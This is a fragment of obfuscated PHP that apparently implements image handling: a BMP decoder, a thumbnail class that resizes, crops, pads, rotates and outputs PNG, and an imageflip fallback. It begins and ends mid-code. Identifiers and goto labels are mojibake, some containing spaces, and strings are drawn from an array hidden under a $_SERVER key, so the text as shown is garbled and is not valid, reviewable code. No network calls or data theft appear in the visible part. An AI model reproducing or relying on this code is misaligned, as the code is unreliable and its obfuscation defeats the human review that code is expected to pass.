$D°¬ƒÖÍ»Ñ = $EË½¾ÖŠ¤š ? $EË½¾ÖŠ¤š : pow(2, $cŒå“ÅŒ²¨); goto cÚÀÜÏßÒ; A–¬§Â“—ö: $D¨·óòÔ‹× = (1 << $cŒå“ÅŒ²¨) - 1 << $aŒ³¯ÎÖÉ; if ($Aï„æ½ÂÒá == 1 || $Aï„æ½ÂÒá == 2) { $b‡²‡áî´ = 0; $FÖä¢ÅÃõÒ = $cŒå“ÅŒ²¨ >> 2 & 1; for (;;) { if ($b‡²‡áî´ < -1 || $b‡²‡áî´ > $BÒ²Œ‘Æ À || $bš¸ƒ®êÖ¯ < -1 || $bš¸ƒ®êÖ¯ > $A®ùëñ¹‰Û) { imagedestroy($c‚–Ã±å¹’); return !1; } $eÇªÅ¯±œ = fread($E¶·…×Á”, 1); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } switch ($eÇªÅ¯±œ) { case $B¸”àƒòøì[1866]: $eÇªÅ¯±œ = fread($E¶·…×Á”, 1); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } switch ($eÇªÅ¯±œ) { case $B¸”àƒòøì[1866]: $bš¸ƒ®êÖ¯ += $F‚‚Å½õœŠ; $b‡²‡áî´ = 0; break; case $B¸”àƒòøì[1868]: $bš¸ƒ®êÖ¯ = 0; $b‡²‡áî´ = 0; break 3; case $B¸”àƒòøì[1869]: $eÇªÅ¯±œ = fread($E¶·…×Á”, 2); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } list(, $BÈÀ×İ›•¼, $cŒòÌ›æ¿ø) = unpack($B¸”àƒòøì[1870], $eÇªÅ¯±œ); $b‡²‡áî´ += $BÈÀ×İ›•¼; $bš¸ƒ®êÖ¯ += $cŒòÌ›æ¿ø * $F‚‚Å½õœŠ; break; default: list(, $cÍé´Ì£ªØ) = unpack($B¸”àƒòøì[1871], $eÇªÅ¯±œ); $fÖè—õçİ¹ = ($cÍé´Ì£ªØ >> $FÖä¢ÅÃõÒ) + ($cÍé´Ì£ªØ & $FÖä¢ÅÃõÒ); $eÇªÅ¯±œ = fread($E¶·…×Á”, $fÖè—õçİ¹ + 1 & ~1); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } for ($A«Åªé’À² = 0, $A÷†šŞË£Ú = 0; $A«Åªé’À² < $cÍé´Ì£ªØ; ++$A«Åªé’À², ++$b‡²‡áî´, $A÷†šŞË£Ú += $cŒå“ÅŒ²¨) { list(, $b›‡œ×„‹÷) = unpack($B¸”àƒòøì[1871], $eÇªÅ¯±œ[$A÷†šŞË£Ú >> 3]); $e´‰á¥Òí› = $A÷†šŞË£Ú & 7; imagesetpixel($c‚–Ã±å¹’, $b‡²‡áî´, $bš¸ƒ®êÖ¯, $bÀµÌ· ‘[($b›‡œ×„‹÷ & $D¨·óòÔ‹× >> $e´‰á¥Òí›) >> $aŒ³¯ÎÖÉ - $e´‰á¥Òí›]); } break; } break; default: $CŸ„¯ÙñƒÌ = fread($E¶·…×Á”, 1); if ($CŸ„¯ÙñƒÌ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } list(, $A“ª§Õİ††, $b›‡œ×„‹÷) = unpack($B¸”àƒòøì[1870], $eÇªÅ¯±œ . $CŸ„¯ÙñƒÌ); for ($A«Åªé’À² = 0, $A÷†šŞË£Ú = 0; $A«Åªé’À² < $A“ª§Õİ††; ++$A«Åªé’À², ++$b‡²‡áî´, $A÷†šŞË£Ú += $cŒå“ÅŒ²¨) { $e´‰á¥Òí› = $A÷†šŞË£Ú & 7; imagesetpixel($c‚–Ã±å¹’, $b‡²‡áî´, $bš¸ƒ®êÖ¯, $bÀµÌ· ‘[($b›‡œ×„‹÷ & $D¨·óòÔ‹× >> $e´‰á¥Òí›) >> $aŒ³¯ÎÖÉ - $e´‰á¥Òí›]); } break; } } } else { for ($dĞ´¨«¢ò = 0; $dĞ´¨«¢ò < $BãÎİŞ¼ÜÃ; ++$dĞ´¨«¢ò, $bš¸ƒ®êÖ¯ += $F‚‚Å½õœŠ) { $eÇªÅ¯±œ = fread($E¶·…×Á”, $añæìŠ¹ÄÆ); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } $A÷†šŞË£Ú = 0; for ($b‡²‡áî´ = 0; $b‡²‡áî´ < $BÒ²Œ‘Æ À; ++$b‡²‡áî´, $A÷†šŞË£Ú += $cŒå“ÅŒ²¨) { list(, $b›‡œ×„‹÷) = unpack($B¸”àƒòøì[1871], $eÇªÅ¯±œ[$A÷†šŞË£Ú >> 3]); $e´‰á¥Òí› = $A÷†šŞË£Ú & 7; imagesetpixel($c‚–Ã±å¹’, $b‡²‡áî´, $bš¸ƒ®êÖ¯, $bÀµÌ· ‘[($b›‡œ×„‹÷ & $D¨·óòÔ‹× >> $e´‰á¥Òí›) >> $aŒ³¯ÎÖÉ - $e´‰á¥Òí›]); } } } goto e·¼˜ìğ; cÚÀÜÏßÒ: $bÀµÌ· ‘ = array(); for ($A«Åªé’À² = 0; $A«Åªé’À² < $D°¬ƒÖÍ»Ñ; ++$A«Åªé’À²) { $eÇªÅ¯±œ = fread($E¶·…×Á”, $d©ÀÁ¿§¢); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } extract(unpack($B¸”àƒòøì[1867], $eÇªÅ¯±œ . $B¸”àƒòøì[1866])); $bÀµÌ· ‘[] = imagecolorallocate($c‚–Ã±å¹’, $c³ÈøõÒ, $céÙã¯ËÀ, $e´‰á¥Òí›); } $aŒ³¯ÎÖÉ = 8 - $cŒå“ÅŒ²¨; goto A–¬§Â“—ö; e·¼˜ìğ: } else { goto C—Üê¡ÒßØ; C—Üê¡ÒßØ: $c‚–Ã±å¹’ = imagecreatetruecolor($BÒ²Œ‘Æ À, $BãÎİŞ¼ÜÃ); imagealphablending($c‚–Ã±å¹’, !1); if ($e›Ñçè“Øã) { imagesavealpha($c‚–Ã±å¹’, !0); } goto Bãó¤éê£ï; Bãó¤éê£ï: $c³à¿‡‘‚ì = $cŒå“ÅŒ²¨ >> 3; $cÜòäÙù©» = $e›Ñçè“Øã ? 127 : 0; $d‰¶™¥à© = $e›Ñçè“Øã ? 1 / $e›Ñçè“Øã : 1; goto d‰Â‚³Ï¬å; d‰Â‚³Ï¬å: $Cù¶¶Ê”†Ï = $C‚”óŸçÇ ? 1 / $C‚”óŸçÇ : 1; $bãÀô¦š— = $AËè‡÷“ ? 1 / $AËè‡÷“ : 1; $Eíù¼¡Ê™ = $F”îËï‡î¬ ? 1 / $F”îËï‡î¬ : 1; goto fß£ÌÃ¶„à; fß£ÌÃ¶„à: for ($dĞ´¨«¢ò = 0; $dĞ´¨«¢ò < $BãÎİŞ¼ÜÃ; ++$dĞ´¨«¢ò, $bš¸ƒ®êÖ¯ += $F‚‚Å½õœŠ) { $eÇªÅ¯±œ = fread($E¶·…×Á”, $añæìŠ¹ÄÆ); if ($eÇªÅ¯±œ === !1) { imagedestroy($c‚–Ã±å¹’); return !1; } $A÷†šŞË£Ú = 0; for ($b‡²‡áî´ = 0; $b‡²‡áî´ < $BÒ²Œ‘Æ À; ++$b‡²‡áî´, $A÷†šŞË£Ú += $c³à¿‡‘‚ì) { list(, $b›‡œ×„‹÷) = unpack($B¸”àƒòøì[1848], substr($eÇªÅ¯±œ, $A÷†šŞË£Ú, $c³à¿‡‘‚ì) . $B¸”àƒòøì[1872]); $fÙÊ”ÚœáÙ = $b›‡œ×„‹÷ & $e›Ñçè“Øã; $A…´•Ï›Ó = $b›‡œ×„‹÷ & $C‚”óŸçÇ; $eêÅ¤ˆ£æ¸ = $b›‡œ×„‹÷ & $AËè‡÷“; $a­Ãã’¶òé = $b›‡œ×„‹÷ & $F”îËï‡î¬; $eÎ¾‡“éä§ = $cÜòäÙù©» - (($fÙÊ”ÚœáÙ << 7) - $fÙÊ”ÚœáÙ) * $d‰¶™¥à©; $c³ÈøõÒ = (($A…´•Ï›Ó << 8) - $A…´•Ï›Ó) * $Cù¶¶Ê”†Ï; $céÙã¯ËÀ = (($eêÅ¤ˆ£æ¸ << 8) - $eêÅ¤ˆ£æ¸) * $bãÀô¦š—; $e´‰á¥Òí› = (($a­Ãã’¶òé << 8) - $a­Ãã’¶òé) * $Eíù¼¡Ê™; imagesetpixel($c‚–Ã±å¹’, $b‡²‡áî´, $bš¸ƒ®êÖ¯, $eÎ¾‡“éä§ << 24 | $c³ÈøõÒ << 16 | $céÙã¯ËÀ << 8 | $e´‰á¥Òí›); } } imagealphablending($c‚–Ã±å¹’, !0); goto bÛß¯ Î; bÛß¯ Î: } return $c‚–Ã±å¹’; goto fõªÆ„øâ÷; FœÑ®¦…ãÂ: $BãÎİŞ¼ÜÃ = abs($A®ùëñ¹‰Û); $bš¸ƒ®êÖ¯ = $A®ùëñ¹‰Û > 0 ? $BãÎİŞ¼ÜÃ - 1 : 0; $F‚‚Å½õœŠ = $A®ùëñ¹‰Û > 0 ? -1 : 1; goto BµŠ¢¼§èŠ; F¡”²óõƒã: if ($eÇªÅ¯±œ === !1) { return !1; } list(, $B„òñ¨¶àŒ) = unpack($B¸”àƒòøì[1848], $eÇªÅ¯±œ); if ($B„òñ¨¶àŒ == 12) { goto D¾ËÍç‰¦Ö; fëàØ±÷’ : $F”îËï‡î¬ = 255; goto c„äèœŞâÎ; D¾ËÍç‰¦Ö: $eÇªÅ¯±œ = fread($E¶·…×Á”, $B„òñ¨¶àŒ - 4); if ($eÇªÅ¯±œ === !1) { return !1; } extract(unpack($B¸”àƒòøì[1849] . $B¸”àƒòøì[1850] . $B¸”àƒòøì[1851] . $B¸”àƒòøì[1852], $eÇªÅ¯±œ)); goto BÜÛ®Ü«Š®; BÜÛ®Ü«Š®: $EË½¾ÖŠ¤š = $CÛçß¬ ³© = $e›Ñçè“Øã = $Aï„æ½ÂÒá = 0; $C‚”óŸçÇ = 16711680; $AËè‡÷“ = 65280; goto fëàØ±÷’ ; c„äèœŞâÎ: } else { if (124 < $B„òñ¨¶àŒ || $B„òñ¨¶àŒ < 40) { return !1; } else { goto fè¨Œù¥¬í; C”ÁÈµ¤ ù: if ($f¹ƒ¯†Ê Ç & 2147483648) { $f¹ƒ¯†Ê Ç = -(~$f¹ƒ¯†Ê Ç & 4294967295) - 1; } if ($AŒ´‰ôÍôß[$B¸”àƒòøì[529]] != 0) { $e£İÛÉ„„ = $cŒå“ÅŒ²¨ == 1 || $cŒå“ÅŒ²¨ == 4 || $cŒå“ÅŒ²¨ == 8 ? ($EË½¾ÖŠ¤š ? $EË½¾ÖŠ¤š : pow(2, $cŒå“ÅŒ²¨)) << 2 : 0; $EÏ´½ä¹ùé = $DÄƒáô®Åá ? $DÄƒáô®Åá : ($BÒ²Œ‘Æ À * $cŒå“ÅŒ²¨ + 31 >> 3 & ~3) * abs($A®ùëñ¹‰Û); $f©‚Ğ“ä¾ = $AŒ´‰ôÍôß[$B¸”àƒòøì[529]] - $EÏ´½ä¹ùé - $e£İÛÉ„„ - 14; if ($B„òñ¨¶àŒ < $f©‚Ğ“ä¾ && 40 <= $B„òñ¨¶àŒ && $B„òñ¨¶àŒ <= 124) { $B„òñ¨¶àŒ = $f©‚Ğ“ä¾; } } if ($B„òñ¨¶àŒ - 40 > 0) { $eÇªÅ¯±œ = fread($E¶·…×Á”, $B„òñ¨¶àŒ - 40); if ($eÇªÅ¯±œ === !1) { return !1; } extract(unpack($B¸”àƒòøì[1862] . $B¸”àƒòøì[1863] . $B¸”àƒòøì[1864] . $B¸”àƒòøì[1865], $eÇªÅ¯±œ . str_repeat($B¸”àƒòøì[1866], 120))); } else { $e›Ñçè“Øã = $C‚”óŸçÇ = $AËè‡÷“ = $F”îËï‡î¬ = 0; } goto bæ¾°ÜÚ…; bæ¾°ÜÚ…: if (($cŒå“ÅŒ²¨ == 16 || $cŒå“ÅŒ²¨ == 24 || $cŒå“ÅŒ²¨ == 32) && $Aï„æ½ÂÒá == 0 && $C‚”óŸçÇ == 0 && $AËè‡÷“ == 0 && $F”îËï‡î¬ == 0) { switch ($cŒå“ÅŒ²¨) { case 16: $C‚”óŸçÇ = 31744; $AËè‡÷“ = 992; $F”îËï‡î¬ = 31; break; case 24: case 32: $C‚”óŸçÇ = 16711680; $AËè‡÷“ = 65280; $F”îËï‡î¬ = 255; break; } } goto a¶›¼˜È÷ˆ; B‰…ŞôÉ–Ô: if ($BÒ²Œ‘Æ À & 2147483648) { $BÒ²Œ‘Æ À = -(~$BÒ²Œ‘Æ À & 4294967295) - 1; } if ($A®ùëñ¹‰Û & 2147483648) { $A®ùëñ¹‰Û = -(~$A®ùëñ¹‰Û & 4294967295) - 1; } if ($cæ„’ß & 2147483648) { $cæ„’ß = -(~$cæ„’ß & 4294967295) - 1; } goto C”ÁÈµ¤ ù; fè¨Œù¥¬í: $eÇªÅ¯±œ = fread($E¶·…×Á”, 36); if ($eÇªÅ¯±œ === !1) { return !1; } extract(unpack($B¸”àƒòøì[1853] . $B¸”àƒòøì[1854] . $B¸”àƒòøì[1851] . $B¸”àƒòøì[1855] . $B¸”àƒòøì[1856] . $B¸”àƒòøì[1857] . $B¸”àƒòøì[1858] . $B¸”àƒòøì[1859] . $B¸”àƒòøì[1860] . $B¸”àƒòøì[1861], $eÇªÅ¯±œ)); goto B‰…ŞôÉ–Ô; a¶›¼˜È÷ˆ: } } goto fµÕ°Ö¹–; fµÕ°Ö¹–: if ($BÒ²Œ‘Æ À == 0 || $A®ùëñ¹‰Û == 0 || $Aùíµ“Ê¿İ != 1 || ($e›Ñçè“Øã & $C‚”óŸçÇ) != 0 || ($e›Ñçè“Øã & $AËè‡÷“) != 0 || ($e›Ñçè“Øã & $F”îËï‡î¬) != 0 || ($C‚”óŸçÇ & $AËè‡÷“) != 0 || ($C‚”óŸçÇ & $F”îËï‡î¬) != 0 || ($AËè‡÷“ & $F”îËï‡î¬) != 0) { return !1; } if ($Aï„æ½ÂÒá == 4 || $Aï„æ½ÂÒá == 5) { $eÇªÅ¯±œ = stream_get_contents($E¶·…×Á”, $DÄƒáô®Åá); if ($eÇªÅ¯±œ === !1) { return !1; } return imagecreatefromstring($eÇªÅ¯±œ); } $añæìŠ¹ÄÆ = $BÒ²Œ‘Æ À * $cŒå“ÅŒ²¨ + 31 >> 3 & ~3; goto FœÑ®¦…ãÂ; Aˆï”†Õ­à: $B¸”àƒòøì =& $_SERVER[¯Ò¬Èè]; if ($AŒ´‰ôÍôß[$B¸”àƒòøì[388]] != 19778) { return !1; } $eÇªÅ¯±œ = fread($E¶·…×Á”, 4); goto F¡”²óõƒã; fõªÆ„øâ÷: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($eˆïÀó®æ”, $bçÑ¶›‹Œø) { goto aÀÓ¿ …; d¹³–ŒºÅÏ: if (!$this->im) { return !1; } $eÂˆŞæáÖ = $_SERVER[¯Ò¬Èè][33]; $this->imgData = GetImageSize($eˆïÀó®æ”, $eÂˆŞæáÖ); goto FßğÀÌöÜĞ; FßğÀÌöÜĞ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto bİ¾ˆèÀÙã; aÀÓ¿ …: $this->srcFile = $eˆïÀó®æ”; $this->echoType = $bçÑ¶›‹Œø; $this->im = self::image($eˆïÀó®æ”); goto d¹³–ŒºÅÏ; bİ¾ˆèÀÙã: } public static function image($B»«¥ñô¸¸) { $B÷±İì£ÈÔ =& $_SERVER[¯Ò¬Èè]; $DÎíÓ„©ê = $B÷±İì£ÈÔ[33]; $c“ˆ«ãÈª¼ = GetImageSize($B»«¥ñô¸¸, $DÎíÓ„©ê); $CÔôËÌìÀ² = !1; switch ($c“ˆ«ãÈª¼[2]) { case IMAGETYPE_GIF: if (!function_exists($B÷±İì£ÈÔ[1873])) { break; } $CÔôËÌìÀ² = imagecreatefromgif($B»«¥ñô¸¸); break; case IMAGETYPE_JPEG: if (!function_exists($B÷±İì£ÈÔ[1874])) { break; } $CÔôËÌìÀ² = imagecreatefromjpeg($B»«¥ñô¸¸); break; case IMAGETYPE_PNG: if (!function_exists($B÷±İì£ÈÔ[1875])) { break; } $CÔôËÌìÀ² = @imagecreatefrompng($B»«¥ñô¸¸); imagesavealpha($CÔôËÌìÀ², !0); break; case IMAGETYPE_XBM: $CÔôËÌìÀ² = imagecreatefromxbm($B»«¥ñô¸¸); break; case IMAGETYPE_WBMP: $CÔôËÌìÀ² = imagecreatefromwbmp($B»«¥ñô¸¸); break; case IMAGETYPE_BMP: $CÔôËÌìÀ² = imagecreatefrombmp($B»«¥ñô¸¸); break; default: break; } return $CÔôËÌìÀ²; } public static function imageSize($C¼‘î‚äØê) { $a‰×ğ²ÎÆÃ =& $_SERVER[¯Ò¬Èè]; $bÊŠ…ŞÔÒë = GetImageSize($C¼‘î‚äØê); if (!$bÊŠ…ŞÔÒë) { return !1; } return array($a‰×ğ²ÎÆÃ[1876] => $bÊŠ…ŞÔÒë[0], $a‰×ğ²ÎÆÃ[1877] => $bÊŠ…ŞÔÒë[1]); } function distortion($EÎ¡±õÖÍá, $AÎ¦Ü¯È£, $F¶Ì­ÀÖ) { $EòòÉ×ƒ‚‚ = $this->creatImage($this->im, $AÎ¦Ü¯È£, $F¶Ì­ÀÖ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($EòòÉ×ƒ‚‚, $EÎ¡±õÖÍá); } function prorate($b¯§¦«ØÒ¯, $cÆ¨ÊÜÎ¾, $d¬ÛÕÒ×‘) { $e—ëß‹ß§ = $cÆ¨ÊÜÎ¾ / $d¬ÛÕÒ×‘; $C¸¤ó¤‚ßÃ = $this->srcW / $this->srcH; if ($e—ëß‹ß§ <= $C¸¤ó¤‚ßÃ) { $FŠã¤Øñˆ = $cÆ¨ÊÜÎ¾; $C…ï£íø— = $FŠã¤Øñˆ * ($this->srcH / $this->srcW); } else { $C…ï£íø— = $d¬ÛÕÒ×‘; $FŠã¤Øñˆ = $C…ï£íø— * ($this->srcW / $this->srcH); } if ($this->srcW > $cÆ¨ÊÜÎ¾ || $this->srcH > $d¬ÛÕÒ×‘) { $e¶‘öù¿•ğ = $this->creatImage($this->im, $FŠã¤Øñˆ, $C…ï£íø—, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e¶‘öù¿•ğ, $b¯§¦«ØÒ¯); } else { $e¶‘öù¿•ğ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e¶‘öù¿•ğ, $b¯§¦«ØÒ¯); } } function cut($cÎ‹ƒµŞ˜É, $F±ã»ÇØÃ­, $d™‚„ïÓÄ¹) { goto EØ‹âÔ–ÀÉ; EØ‹âÔ–ÀÉ: $F‘›ê§‰á“ = $F±ã»ÇØÃ­ / $d™‚„ïÓÄ¹; $D‡ô—è¥´Ì = $this->srcW / $this->srcH; if ($F‘›ê§‰á“ <= $D‡ô—è¥´Ì) { $eŒ‹ÄÓëËª = $d™‚„ïÓÄ¹; $e¿­Ë¹™Ô = $eŒ‹ÄÓëËª * ($this->srcW / $this->srcH); } else { $e¿­Ë¹™Ô = $F±ã»ÇØÃ­; $eŒ‹ÄÓëËª = $e¿­Ë¹™Ô * ($this->srcH / $this->srcW); } goto Bºµø¦ÂĞ; B½ã¸ª¿£÷: return $this->echoImage($fµÃËÄ‹·Ş, $cÎ‹ƒµŞ˜É); goto fºóÊ›»‰; Bºµø¦ÂĞ: $a¯ôœ¯ËÚÍ = $this->creatImage($this->im, $e¿­Ë¹™Ô, $eŒ‹ÄÓëËª, 0, 0, 0, 0, $this->srcW, $this->srcH); $fµÃËÄ‹·Ş = $this->creatImage($a¯ôœ¯ËÚÍ, $F±ã»ÇØÃ­, $d™‚„ïÓÄ¹, 0, 0, ($e¿­Ë¹™Ô - $F±ã»ÇØÃ­) / 2, ($eŒ‹ÄÓëËª - $d™‚„ïÓÄ¹) / 2, $F±ã»ÇØÃ­, $d™‚„ïÓÄ¹); imageDestroy($a¯ôœ¯ËÚÍ); goto B½ã¸ª¿£÷; fºóÊ›»‰: } function backFill($DêˆÖê™œé, $DßËª¿¹ˆ, $c„³™ÈÇ¼œ, $Bß¤±¾êŠ = false, $eÅ¿ÜöŠ¼£ = 255, $cÁÇïº¶ = 255, $C¥¸¥¬š„ = 255) { goto CÂä“í¾ğİ; BëÅ¤Ì…”™: return $this->echoImage($fÔŒßÀÄË¦, $DêˆÖê™œé); goto EÈáêõ’“×; CÂä“í¾ğİ: $e„î¼Õ…Î = $DßËª¿¹ˆ / $c„³™ÈÇ¼œ; $BÜŒ½ßÉ½¢ = $this->srcW / $this->srcH; if ($e„î¼Õ…Î <= $BÜŒ½ßÉ½¢) { $d¡Ö•Ô¸¦« = $DßËª¿¹ˆ; $EšöÚÙË¸ = $d¡Ö•Ô¸¦« * ($this->srcH / $this->srcW); } else { $EšöÚÙË¸ = $c„³™ÈÇ¼œ; $d¡Ö•Ô¸¦« = $EšöÚÙË¸ * ($this->srcW / $this->srcH); } goto dëğÖåœÕÏ; cçĞø‹É‡: if ($Bß¤±¾êŠ) { $A—ŒÀØ‰ô = imageColorTransparent($fÔŒßÀÄË¦, $A—ŒÀØ‰ô); $c°Áâà†æš = $c„³™ÈÇ¼œ - $EšöÚÙË¸; } imageFilledRectangle($fÔŒßÀÄË¦, 0, 0, $DßËª¿¹ˆ, $c„³™ÈÇ¼œ, $A—ŒÀØ‰ô); if ($this->srcW > $DßËª¿¹ˆ || $this->srcH > $c„³™ÈÇ¼œ) { $Bº†Ï¶³˜ = $this->creatImage($this->im, $d¡Ö•Ô¸¦«, $EšöÚÙË¸, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($d¡Ö•Ô¸¦« < $DßËª¿¹ˆ) { imageCopy($fÔŒßÀÄË¦, $Bº†Ï¶³˜, ($DßËª¿¹ˆ - $d¡Ö•Ô¸¦«) / 2, 0, 0, 0, $d¡Ö•Ô¸¦«, $EšöÚÙË¸); } else { if ($EšöÚÙË¸ < $c„³™ÈÇ¼œ) { imageCopy($fÔŒßÀÄË¦, $Bº†Ï¶³˜, 0, $c°Áâà†æš, 0, 0, $d¡Ö•Ô¸¦«, $EšöÚÙË¸); } else { imageCopy($fÔŒßÀÄË¦, $Bº†Ï¶³˜, 0, 0, 0, 0, $d¡Ö•Ô¸¦«, $EšöÚÙË¸); } } } else { imageCopyMerge($fÔŒßÀÄË¦, $this->im, ($DßËª¿¹ˆ - $d¡Ö•Ô¸¦«) / 2, $c°Áâà†æš, 0, 0, $d¡Ö•Ô¸¦«, $EšöÚÙË¸, 100); } goto BëÅ¤Ì…”™; dëğÖåœÕÏ: if (function_exists($_SERVER[¯Ò¬Èè][1878])) { @($fÔŒßÀÄË¦ = imageCreateTrueColor($DßËª¿¹ˆ, $c„³™ÈÇ¼œ)); if (!$fÔŒßÀÄË¦) { $fÔŒßÀÄË¦ = imageCreate($DßËª¿¹ˆ, $c„³™ÈÇ¼œ); } } else { $fÔŒßÀÄË¦ = imageCreate($DßËª¿¹ˆ, $c„³™ÈÇ¼œ); } $c°Áâà†æš = ($c„³™ÈÇ¼œ - $EšöÚÙË¸) / 2; $A—ŒÀØ‰ô = imagecolorallocate($fÔŒßÀÄË¦, $eÅ¿ÜöŠ¼£, $cÁÇïº¶, $C¥¸¥¬š„); goto cçĞø‹É‡; EÈáêõ’“×: } function creatImage($b›˜ğ‚æ‡, $D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’, $d³¸¡ÅÜƒğ, $e‹¶Ø§îÈ, $aÇ§’æŒ¡†, $DÇ‚½‰³–, $DİÑ¡Äƒáî, $AŒåŒ¾Öñ) { if (function_exists($_SERVER[¯Ò¬Èè][1878])) { @($eÙ‘ôÅâËë = ImageCreateTrueColor($D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’)); @imagealphablending($eÙ‘ôÅâËë, !1); @imagesavealpha($eÙ‘ôÅâËë, !0); if ($eÙ‘ôÅâËë) { imageCopyResampled($eÙ‘ôÅâËë, $b›˜ğ‚æ‡, $d³¸¡ÅÜƒğ, $e‹¶Ø§îÈ, $aÇ§’æŒ¡†, $DÇ‚½‰³–, $D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’, $DİÑ¡Äƒáî, $AŒåŒ¾Öñ); } else { $eÙ‘ôÅâËë = ImageCreate($D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’); imageCopyResized($eÙ‘ôÅâËë, $b›˜ğ‚æ‡, $d³¸¡ÅÜƒğ, $e‹¶Ø§îÈ, $aÇ§’æŒ¡†, $DÇ‚½‰³–, $D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’, $DİÑ¡Äƒáî, $AŒåŒ¾Öñ); } } else { $eÙ‘ôÅâËë = ImageCreate($D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’); imageCopyResized($eÙ‘ôÅâËë, $b›˜ğ‚æ‡, $d³¸¡ÅÜƒğ, $e‹¶Ø§îÈ, $aÇ§’æŒ¡†, $DÇ‚½‰³–, $D÷ƒÑ¨•ñ¶, $CŠÛ›†•¦’, $DİÑ¡Äƒáî, $AŒåŒ¾Öñ); } return $eÙ‘ôÅâËë; } public function imgRotate($F‡áì¦‚†¨, $cšËî”–²Å) { goto b¸«ï÷¡õ; b¸«ï÷¡õ: if (!$this->im || $cšËî”–²Å % 360 === 0 || !function_exists($_SERVER[¯Ò¬Èè][1879])) { return !1; } $bŸÀ‹«ª– = imageRotate($this->im, 360 - $cšËî”–²Å, 0); $D¸çËÓãçó = !1; goto F¸º­«Ë¶¹; C¿èõ– ·Ë: return $D¸çËÓãçó; goto dªŠ£ì·¢; F¸º­«Ë¶¹: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $D¸çËÓãçó = imagegif($bŸÀ‹«ª–, $F‡áì¦‚†¨); break; case IMAGETYPE_JPEG: $D¸çËÓãçó = imagejpeg($bŸÀ‹«ª–, $F‡áì¦‚†¨, 100); break; case IMAGETYPE_PNG: $D¸çËÓãçó = imagePNG($bŸÀ‹«ª–, $F‡áì¦‚†¨); break; default: break; } imageDestroy($bŸÀ‹«ª–); imageDestroy($this->im); goto C¿èõ– ·Ë; dªŠ£ì·¢: } function echoImage($b¼¥ê‹³Úœ, $cŸßÉ‡³Ö) { goto f³¸À¬‚¹; f³¸À¬‚¹: $dÏ¸ÕöÃ‚ =& $_SERVER[¯Ò¬Èè]; if (!$b¼¥ê‹³Úœ) { return !1; } ob_get_clean(); goto a¯¾Î›ïÜÆ; dŒ»º”ïğÅ: imageDestroy($this->im); return $EôŒí“‡°; goto f Ê·¯§šË; a¯¾Î›ïÜÆ: $EôŒí“‡° = !1; switch ($this->echoType) { case $dÏ¸ÕöÃ‚[1880]: $EôŒí“‡° = imagePNG($b¼¥ê‹³Úœ); break; case $dÏ¸ÕöÃ‚[167]: $EôŒí“‡° = imagePNG($b¼¥ê‹³Úœ, $cŸßÉ‡³Ö); break; } imageDestroy($b¼¥ê‹³Úœ); goto dŒ»º”ïğÅ; f Ê·¯§šË: } } if (!function_exists($_SERVER[¯Ò¬Èè][1881])) { define($_SERVER[¯Ò¬Èè][1882], 0); define($_SERVER[¯Ò¬Èè][1883], 1); define($_SERVER[¯Ò¬Èè][1884], 2); function imageflip($f ñæšø·×, $EÙ…Î¿¯µÁ) { switch ($EÙ…Î¿¯µÁ) { case IMG_FLIP_HORIZONTAL: $A‰ÈŠÅˆÌ‡ = imagesx($f ñæšø·×) - 1; $F­ÏÔˆ‹­± = $A‰ÈŠÅˆÌ‡ / 2; $dŠŒ¶™Í¸é = imagesy($f ñæšø·×); $bÛ˜«ƒ¢İÜ = imageistruecolor($f ñæšø·×) ? imagecreatetruecolor(1, $dŠŒ¶™Í¸é) : imagecreate(1, $dŠŒ¶™Í¸é); for ($dæôäõï = 0; $dæôäõï < $F­ÏÔˆ‹­±; ++$dæôäõï) { imagecopy($bÛ˜«ƒ¢İÜ, $f ñæšø·×, 0, 0, $dæôäõï, 0, 1, $dŠŒ¶™Í¸é); imagecopy($f ñæšø·×, $f ñæšø·×, $dæôäõï, 0, $A‰ÈŠÅˆÌ‡ - $dæôäõï, 0, 1, $dŠŒ¶™Í¸é); imagecopy($f ñæšø·×, $bÛ˜«ƒ¢İÜ, $A‰ÈŠÅˆÌ‡ - $dæôäõï, 0, 0, 0, 1, $dŠŒ¶™Í¸é); } break; case IMG_FLIP_VERTICAL: $F‘ˆ¥ï‡‘Â = imagesx($f ñæšø·×); $dæÙ½»¬ŒÌ = imagesy($f ñæšø·×) - 1; $bÑ·É™ÙéÚ = $dæÙ½»¬ŒÌ / 2; $bÛ˜«ƒ¢İÜ = imageistruecolor($f ñæšø·×) ? imagecreatetruecolor($F‘ˆ¥ï‡‘Â, 1) : imagecreate($F‘ˆ¥ï‡‘Â, 1); for ($A¨Éæ”´Ïù = 0; $A¨Éæ”´Ïù < $bÑ·É™ÙéÚ; ++$A¨Éæ”´Ïù) { imagecopy($bÛ˜«ƒ¢İÜ, $f ñæšø·×, 0, 0, 0, $A¨Éæ”´Ïù, $F‘ˆ¥ï‡‘Â, 1); imagecopy($f ñæšø·×, $f ñæšø·×, 0, $A¨Éæ”´Ïù, 0, $dæÙ½»¬ŒÌ - $A¨Éæ”´Ïù, $F‘ˆ¥ï‡‘Â, 1); imagecopy($f ñæšø·×, $bÛ˜«ƒ¢İÜ, 0, $dæÙ½»¬ŒÌ - $A¨Éæ”´Ïù, 0, 0, $F‘ˆ¥ï‡‘Â, 1); } break; case IMG_FLIP_BOTH: $F‘ˆ¥ï‡‘Â = imagesx($f 